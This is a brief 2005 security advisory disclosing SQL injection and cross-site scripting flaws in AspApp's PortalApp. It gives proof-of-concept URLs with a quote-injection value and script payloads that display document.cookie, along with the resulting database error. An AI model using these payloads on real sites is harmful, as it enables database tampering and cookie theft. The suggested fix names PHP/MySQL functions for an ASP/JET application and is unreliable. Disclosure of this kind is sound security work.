Dcrab 's Security Advisory

http://www.hackerscenter.com/

Severity:  Medium
Title: Multiple sql injection, and xss vulnerabilities in PortalApp.
Date: March  30,  2005
Vendor: AspApp
Vendor site: http://www.aspapp.com

Summary:
There are multiple sql injection, xss vulnerabilities in the PortalApp.

Proof of Concept Exploits:

http://localhost/ad_click.asp?banner_id='SQL_INJECTION
Microsoft JET Database Engine error '80040e14'

Syntax error in string in query expression 'banner_id = 'SQL_INJECTION'.

/ad_click.asp, line 14


http://localhost/content.asp?contenttype=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
Pops cookie


http://localhost/content.asp?do_search=1&keywords='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
Pops cookie


Possible fix: The usage of htmlspeacialchars(), mysql_escape_string(), mysql_real_escape_string() and other functions for input validation before passing user input to the mysql database, or before echoing data on the screen, would solve these problems.
